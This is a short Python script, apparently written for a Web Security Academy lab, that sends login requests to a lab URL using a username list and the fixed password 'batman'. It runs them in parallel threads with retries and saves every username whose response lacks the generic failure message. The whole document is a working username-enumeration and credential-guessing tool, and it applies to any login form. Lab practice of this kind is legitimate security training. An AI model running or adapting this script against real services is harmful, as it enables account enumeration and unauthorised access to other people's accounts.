import pathlib
from concurrent.futures import ThreadPoolExecutor as Executor

import requests

WORKSPACE = pathlib.Path(__file__).parent

expected = "Invalid username or password."

URL = "https://0a6a00af038b852781e3def500a6005b.web-security-academy.net/login"

user_list = open(WORKSPACE / "original_user_list.txt").readlines()

size = len(user_list)

RETRY = 5

def check_user(user: str) -> str | None:
    
    for _ in range(RETRY):
        res = requests.post(URL, data={
            "username": user.strip(),
            "password": "batman"
        }, cookies={}).content.decode(encoding="utf8")

        if res.find(expected) == -1:
            print(f"Target Response found for user: {user}")
            print(res)
            return user
        
    return None

with Executor(max_workers=5) as exec:
    results = exec.map(check_user, user_list)
    valid = [user for user in results if user is not None]
    print(*valid)

    open(WORKSPACE / "valid_users.txt", "w").writelines(valid)